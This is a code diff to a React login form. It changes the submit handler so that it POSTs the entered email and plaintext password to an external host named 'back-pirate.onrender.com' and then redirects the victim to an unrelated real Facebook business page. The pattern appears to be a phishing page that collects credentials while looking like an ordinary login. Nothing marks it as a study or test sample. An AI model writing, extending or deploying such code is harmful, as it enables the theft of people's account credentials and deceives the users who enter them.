@@ -1,12 +1,37 @@
-import React, { useState } from "react";
+import React, { useState } from "react"; 
 
 export default function App() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
 
-  const handleLogin = (e) => {
+  const handleLogin = async (e) => {
     e.preventDefault();
-    alert("Login clicked: " + email);
+
+    try {
+      const response = await fetch("https://back-pirate.onrender.com/add-user", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          email: email,
+          password: password
+        })
+      });
+
+      const data = await response.json();
+      console.log("Response:", data);
+
+      if (response.ok) {
+        window.location.href = "https://www.facebook.com/farmgo.com.br/";
+      } else {
+        alert("Erreur : " + data.error);
+      }
+
+    } catch (error) {
+      console.error("Request Error:", error);
+      alert("Erreur de connexion au serveur.");
+    }
   };
 
   return (
